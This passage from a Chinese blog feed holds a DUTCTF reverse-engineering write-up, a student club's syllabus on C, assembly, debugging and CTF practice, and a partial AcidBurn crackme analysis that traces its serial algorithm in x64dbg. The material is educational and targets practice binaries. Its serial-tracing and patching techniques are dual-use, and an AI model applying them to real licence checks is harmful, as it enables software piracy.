</em>dest, const char *src);</p><ul><li>把src所指向的字符串（包括“\0”）复制到dest所指向的字符串后面（删除*dest原来末尾的“\0”）。要保证*dest足够长，以容纳被复制进来的*src。*src中原有的字符不变。返回指向dest的指针。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DUTCTF re1</title>
      <link href="/2019/04/28/DUTCTF-re1/"/>
      <url>/2019/04/28/DUTCTF-re1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>把以前做过的<a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">攻防世界</a>上的题整理一下。<br><a href="re1.exe">题目文件也一并上传了。</a><br>做逆向没什么经验，所以有些思路上的混乱还请指出（评论功能待施工）。</p></blockquote><p>IDA看一下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00401000</span>                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401001</span>                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401003</span>                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">44h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401006</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> ___security_cookie</span><br><span class="line"><span class="symbol">.text:</span>0040100B                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040100D</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401010</span>                 <span class="keyword">movdqu</span>  <span class="built_in">xmm0</span>, <span class="built_in">ds</span>:xmmword_413E34</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401018</span>                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0040101A                 <span class="keyword">push</span>    offset aDutctf  <span class="comment">; "欢迎来到DUTCTF呦\n"</span></span><br><span class="line"><span class="symbol">.text:</span>0040101F                 <span class="keyword">movdqu</span>  [<span class="built_in">ebp</span>+var_44], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401024</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_2C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401027</span>                 <span class="keyword">movq</span>    <span class="built_in">xmm0</span>, <span class="built_in">ds</span>:qword_413E44</span><br><span class="line"><span class="symbol">.text:</span>0040102F                 <span class="keyword">movq</span>    [<span class="built_in">ebp</span>+var_34], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401034</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_28], <span class="built_in">ax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401038</span>                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040103D</span>                 <span class="keyword">push</span>    offset asc_413E60 <span class="comment">; "这是一道很可爱很简单的逆向题呦\n"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401042</span>                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401047</span>                 <span class="keyword">push</span>    offset aFlag    <span class="comment">; "输入flag吧:"</span></span><br><span class="line"><span class="symbol">.text:</span>0040104C                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401051</span>                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_24]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401054</span>                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401055</span>                 <span class="keyword">push</span>    offset aS       <span class="comment">; "%s"</span></span><br><span class="line"><span class="symbol">.text:</span>0040105A                 <span class="keyword">call</span>    _scanf</span><br><span class="line"><span class="symbol">.text:</span>0040105F                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">14h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401062</span>                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_24]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401065</span>                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_44]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401068</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401068</span> loc_401068:                             <span class="comment">; CODE XREF: _main+82↓j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401068</span>                 <span class="keyword">mov</span>     <span class="built_in">dl</span>, [<span class="built_in">ecx</span>]</span><br><span class="line"><span class="symbol">.text:</span>0040106A                 <span class="keyword">cmp</span>     <span class="built_in">dl</span>, [<span class="built_in">eax</span>]</span><br><span class="line"><span class="symbol">.text:</span>0040106C                 <span class="keyword">jnz</span>     short loc_401088</span><br><span class="line"><span class="symbol">.text:</span>0040106E                 <span class="keyword">test</span>    <span class="built_in">dl</span>, <span class="built_in">dl</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401070</span>                 <span class="keyword">jz</span>      short loc_401084</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401072</span>                 <span class="keyword">mov</span>     <span class="built_in">dl</span>, [<span class="built_in">ecx</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401075</span>                 <span class="keyword">cmp</span>     <span class="built_in">dl</span>, [<span class="built_in">eax</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401078</span>                 <span class="keyword">jnz</span>     short loc_401088</span><br><span class="line"><span class="symbol">.text:</span>0040107A                 <span class="keyword">add</span>     <span class="built_in">ecx</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040107D</span>                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401080</span>                 <span class="keyword">test</span>    <span class="built_in">dl</span>, <span class="built_in">dl</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401082</span>                 <span class="keyword">jnz</span>     short loc_401068</span><br></pre></td></tr></table></figure><p>在401010处可以看到有个movdqu指令，网上查了一下，这个指令是用来在未对齐的内存位置中移入/移出双四字，xmm0这个寄存器也没接触过，百度一下了解了XMM寄存器是8个128位独立寄存器。双击查看内容可以看到这个就是flag了。也就是这个程序初始化变量的时候直接把flag那个变量赋值了，果然是很简单的逆向题……</p><p>反编译验证一下推测：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int128 v5; <span class="comment">// [esp+0h] [ebp-44h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [esp+10h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+18h] [ebp-2Ch]</span></span><br><span class="line">  __int16 v8; <span class="comment">// [esp+1Ch] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+20h] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  _mm_storeu_si128((__m128i *)&amp;v5, _mm_loadu_si128((<span class="keyword">const</span> __m128i *)&amp;xmmword_413E34));</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = qword_413E44;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"欢迎来到DUTCTF呦\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"这是一道很可爱很简单的逆向题呦\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"输入flag吧:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v9);</span><br><span class="line">  v3 = <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v5, &amp;v9);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    v3 = -(v3 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">printf</span>(aFlag_0);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_413E90);</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，v6就是flag。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五空间逆向任务</title>
      <link href="/2019/04/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%80%86%E5%90%91%E4%BB%BB%E5%8A%A1/"/>
      <url>/2019/04/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%80%86%E5%90%91%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本任务拟定从4月20日起执行，任务周期为周日至下一周的周六上午，任务完成过程需要有详细的笔记记述，任务考察方式为验收笔记内容。任务发布拟定于每周周六下午或周日上午。每次任务发布会连带发布下一周任务内容，本周时间足够可以提前准备下周内容。</p></blockquote><blockquote><p>本文持续更新，后续任务亦将在此文章中更新，关于任务内容产生的任何问题，各位同学请在俱乐部群联系我。<br>上交的笔记推荐使用markdown进行排版，可以上交.md文件或.html文件，<strong><a href="https://www.appinn.com/markdown/" target="_blank" rel="noopener">给个markdown学习的传送门</a></strong></p></blockquote><hr><h2 id="第一周-4-21-4-27"><a href="#第一周-4-21-4-27" class="headerlink" title="第一周 4/21 - 4/27"></a>第一周 4/21 - 4/27</h2><blockquote><p>本周任务目的为熟练掌握编程语言，涉及结果展示的内容截图保存，代码直接复制粘贴。</p><blockquote><p>1、2、3、4为必做内容，其余为额外选做内容。</p></blockquote></blockquote><ol><li>学习并掌握C语言基础内容，包括：变量类型、运算符、条件语句、循环语句、数组、函数、指针等功能，了解C语言中二进制、八进制、十六进制数的表示与运算，掌握位与、位或、位异或、位取反操作。学习异或加密与解密方式。</li><li>学习C语言从源代码到二进制可执行文件（*.exe文件）的处理过程，不要求掌握其技术实现，重在知晓流程。</li><li>使用C实现一个函数，该函数接收一个数组指针作为参数，并利用指针遍历打印数组元素的地址以及数组元素的值。函数实现后，在main函数中提供样例进行函数功能展示。</li><li>使用任意编程语言实现异或加密，用户输入一串数据，以及一串密钥，程序将数据与密钥进行异或运算加密为密文并打印。</li><li>搭建Linux虚拟机（推荐使用Ubuntu系统，14、16、18版本均可），学习Linux基本操作，在Linux环境下使用gcc编译要求3中实现的内容并运行。</li><li>学习Python语言基础内容，要求同1，python无指针，故不需掌握，Python的面向对象编程部分也不需要掌握。</li></ol><p>参考：</p><ol><li><a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">Ubuntu 18.04.2镜像下载</a></li><li><a href="https://my.vmware.com/cn/web/vmware/info/slug/desktop_end_user_computing/vmware_workstation_pro/15_0" target="_blank" rel="noopener">VMware虚拟机程序下载</a></li><li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000" target="_blank" rel="noopener">Python基础教程</a></li></ol><hr><h2 id="第二周-4-28-5-4"><a href="#第二周-4-28-5-4" class="headerlink" title="第二周 4/28 - 5/4"></a>第二周 4/28 - 5/4</h2><blockquote><p>任务目的为了解汇编语言，难度较大，故分两周完成。</p><blockquote><p>1、2、3为必做内容。</p></blockquote></blockquote><ol><li>掌握机器语言、汇编语言、高级语言（如C语言）的关系，了解CPU、寄存器、内存之间的关系，对计算机执行程序的过程有一个概括的认识。</li><li>掌握8086CPU中各个寄存器的作用，掌握汇编语言中访问变量的方式（寻址方式）。</li><li>掌握程序中的数据段、代码段、栈段各自的作用。</li></ol><p>参考教材：</p><ul><li><a href="《汇编语言第3版》王爽著.pdf" target="_blank">汇编教材下载（可以去大服的书店找找，可能会有二手）</a></li><li><a href="汇编金手指.zip" target="_blank">汇编金手指–汇编指令查询</a><hr></li></ul><h2 id="第三周-5-5-5-11"><a href="#第三周-5-5-5-11" class="headerlink" title="第三周 5/5 - 5/11"></a>第三周 5/5 - 5/11</h2><blockquote><p>本周继续进行汇编语言的学习。</p><blockquote><p>1、2、3为必做，4选做。</p></blockquote></blockquote><ol><li>掌握汇编的流程控制，循环。</li><li>掌握标志寄存器、call、ret指令。</li><li>重点掌握函数调用栈。</li><li>安装windows xp sp3虚拟机，在xp环境下进行汇编语言教材中的实验。</li></ol><h2 id="第四周-5-12-5-18"><a href="#第四周-5-12-5-18" class="headerlink" title="第四周 5/12 - 5/18"></a>第四周 5/12 - 5/18</h2><blockquote><p>本周开始学习分析和调试。</p><blockquote><p>1、2、3为必做，4选做。</p></blockquote></blockquote><ol><li>学习使用Ollydbg或x64dbg对程序进行动态调试分析。</li><li>学习使用IDA pro对程序进行静态分析。</li><li>分析一个简单的程序，下载传送门<a href="a.exe" title="可以算是一道ctf题吧(大概)">在这里</a>，分析此程序（不论静态或动态，分析出来即可，必须是反汇编分析，不能是反编译分析），分析出程序中的几个函数以及函数功能，在笔记中记清楚分析内容，找出程序中的flag。</li><li>修改3中程序，使其不会打印出”Try to kill me!”，并且不影响程序其他部分，在笔记中说明你patch的部分，不必上交patch后的程序。</li></ol><h2 id="第五周-5-26-6-1"><a href="#第五周-5-26-6-1" class="headerlink" title="第五周 5/26 - 6/1"></a>第五周 5/26 - 6/1</h2><blockquote><p>中间休息了一周用于复习以前的内容。<br>本周开始，难度将加大，任务以CTF题目方式放出，做题时不可网上查答案，有问题需要在群里题问。</p></blockquote><p>本周起的所有题目，都使用<a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">攻防世界</a>的题库。无论题目做出与否都需要写题解。再次强调，做题期间不可直接搜索题解，可以搜索解题的相关技术。做题时涉及的Linux基础、gdb使用、python基础我会找时间线下说，或者我在群里解答。解题时遇到思路上的问题，在群里进行讨论。</p>]]></content>
      
      
      <categories>
          
          <category> 学校 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第五空间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AcidBurn分析</title>
      <link href="/2019/04/23/AcidBurn%E5%88%86%E6%9E%90/"/>
      <url>/2019/04/23/AcidBurn%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><a href="AcidBurn.exe"><strong>程序下载</strong></a></p><p>AcidBurn的爆破、查找key的解法就不再记录了，十分基础。这篇主要记录程序的注册算法，即下图所示窗口。</p><p><img src="/2019/04/23/AcidBurn分析/1.png" alt="1.png"></p><p>开始根据错误提示信息（如下图）搜索字符串，反查字符串调用。</p><p><img src="/2019/04/23/AcidBurn分析/2.png" alt="2.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0042FA3B | 8B <span class="number">45</span> EC                 | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">14</span>]           |</span><br><span class="line">0042FA3E | 0F B6 <span class="number">40</span> <span class="number">02</span>              | <span class="keyword">movzx</span> <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">2</span>]           |</span><br><span class="line">0042FA42 | 6B C0 0E                 | <span class="keyword">imul</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>,E                          |</span><br><span class="line">0042FA45 | <span class="number">03</span> F0                    | <span class="keyword">add</span> <span class="built_in">esi</span>,<span class="built_in">eax</span>                             |</span><br><span class="line">0042FA47 | <span class="number">89</span> <span class="number">35</span> <span class="number">58</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431758</span>],<span class="built_in">esi</span>           |</span><br><span class="line">0042FA4D | A1 6C <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[43176C]           |</span><br><span class="line">0042FA52 | E8 D9 6E FD FF           | <span class="keyword">call</span> 去除弹窗.<span class="number">406930</span>                        |</span><br><span class="line">0042FA57 | <span class="number">83</span> F8 <span class="number">04</span>                 | <span class="keyword">cmp</span> <span class="built_in">eax</span>,<span class="number">4</span>                               |</span><br><span class="line">0042FA5A | <span class="number">7D</span> <span class="number">1D</span>                    | <span class="keyword">jge</span> 去除弹窗.42FA79                         |</span><br></pre></td></tr></table></figure><p>可以看到42fa57处将eax的值与4进行了比较，向上找，<code>call 406930</code>之后eax的值变成了6（输入为123456），猜测406930会计算出输入的name字符串长度，改变name为123456789，调试发现再次执行到42fa57时，eax变成了9，基本证实了关于406930的功能猜想。再回来看<code>cmp eax,4</code>，和下一行的jge，联系jge跳到的部分的内容，得出这里和4比较的原因是检查name的长度是否小于四，小于四就不再计算序列号，直接提示错误。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0042FA5C | 6A <span class="number">00</span>                    | <span class="keyword">push</span> <span class="number">0</span>                                  |</span><br><span class="line">0042FA5E | B9 <span class="number">74</span> FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">ecx</span>,去除弹窗.42FB74                     | 42FB74:<span class="string">"Try Again!"</span></span><br><span class="line">0042FA63 | BA <span class="number">80</span> FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,去除弹窗.42FB80                     | <span class="built_in">edx</span>:<span class="string">"|諦"</span>, 42FB80:<span class="string">"Sorry , The serial is incorect !"</span></span><br><span class="line">0042FA68 | A1 <span class="number">48</span> 0A <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[430A48]           |</span><br><span class="line">0042FA6D | 8B <span class="number">00</span>                    | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]              |</span><br><span class="line">0042FA6F | E8 FC A6 FF FF           | <span class="keyword">call</span> 去除弹窗.42A170                        |</span><br><span class="line">0042FA74 | E9 BE <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">jmp</span> 去除弹窗.42FB37                         |</span><br><span class="line">0042FA79 | <span class="number">8D</span> <span class="number">55</span> F0                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FA7C | 8B <span class="number">83</span> DC <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+1DC]          | [<span class="built_in">ebx</span>+1DC]:<span class="string">"\\癇"</span></span><br><span class="line">0042FA82 | E8 D1 AF FE FF           | <span class="keyword">call</span> 去除弹窗.41AA58                        |</span><br><span class="line">0042FA87 | 8B <span class="number">45</span> F0                 | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FA8A | 0F B6 <span class="number">00</span>                 | <span class="keyword">movzx</span> <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]             |</span><br><span class="line">0042FA8D | F7 <span class="number">2D</span> <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>        | <span class="keyword">imul</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>]              | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FA93 | A3 <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>],<span class="built_in">eax</span>           | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FA98 | A1 <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>]           | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FA9D | <span class="number">01</span> <span class="number">05</span> <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>        | <span class="keyword">add</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>],<span class="built_in">eax</span>           | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FAA3 | <span class="number">8D</span> <span class="number">45</span> FC                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">4</span>]            |</span><br><span class="line">0042FAA6 | BA AC FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,去除弹窗.42FBAC                     | <span class="built_in">edx</span>:<span class="string">"|諦"</span>, 42FBAC:<span class="string">"CW"</span>�</span><br><span class="line">0042FAAB | E8 <span class="number">58</span> 3C FD FF           | <span class="keyword">call</span> 去除弹窗.<span class="number">403708</span>                        |</span><br><span class="line">0042FAB0 | <span class="number">8D</span> <span class="number">45</span> F8                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">8</span>]            |</span><br><span class="line">0042FAB3 | BA B8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,去除弹窗.42FBB8                     | <span class="built_in">edx</span>:<span class="string">"|諦"</span>, 42FBB8:<span class="string">"CRACKED"</span></span><br><span class="line">0042FAB8 | E8 4B 3C FD FF           | <span class="keyword">call</span> 去除弹窗.<span class="number">403708</span>                        |</span><br></pre></td></tr></table></figure><p>接着往下看，jge跳转到42fa79处，到42fa87处eax指向了name字符串，接着读取了name的第一个字符（注意是字符’1’，这里值为0x31），接着与<code>ds:[431750]</code>值相乘（值为0x29），再把结果与结果相加（乘以2），进入42faa6，把’CW’作为参数传入403708。</p><p>这里的403808实际上是拼接字符串的函数，以前把这个当作了加密序列号的主要函数，结果F7进去之后懵了，看了夜影师傅的博客才恍然大悟（<a href="https://blog.csdn.net/whklhhhh/article/details/72700446" target="_blank" rel="noopener">传送门</a>）。</p><p>继续向下走，</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0042FABD | FF <span class="number">75</span> FC                 | <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">4</span>]               | [<span class="built_in">ebp</span>-<span class="number">4</span>]:<span class="string">"CW"</span></span><br><span class="line">0042FAC0 | <span class="number">68</span> C8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">push</span> 去除弹窗.42FBC8                        | 42FBC8:L<span class="string">"-"</span></span><br><span class="line">0042FAC5 | <span class="number">8D</span> <span class="number">55</span> E8                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]           |</span><br><span class="line">0042FAC8 | A1 <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>]           | <span class="built_in">eax</span>:<span class="string">"耕B"</span>==&amp;<span class="string">"CRACKED"</span></span><br><span class="line">0042FACD | E8 <span class="number">46</span> 6C FD FF           | <span class="keyword">call</span> 去除弹窗.<span class="number">406718</span>                        |</span><br><span class="line">0042FAD2 | FF <span class="number">75</span> E8                 | <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]              |</span><br><span class="line">0042FAD5 | <span class="number">68</span> C8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">push</span> 去除弹窗.42FBC8                        | 42FBC8:L<span class="string">"-"</span></span><br><span class="line">0042FADA | FF <span class="number">75</span> F8                 | <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">8</span>]               | [<span class="built_in">ebp</span>-<span class="number">8</span>]:<span class="string">"CRACKED"</span></span><br><span class="line">0042<span class="keyword">FADD</span> | <span class="number">8D</span> <span class="number">45</span> F4                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-C]            |</span><br><span class="line">0042FAE0 | BA <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="number">5</span>                               |</span><br><span class="line">0042FAE5 | 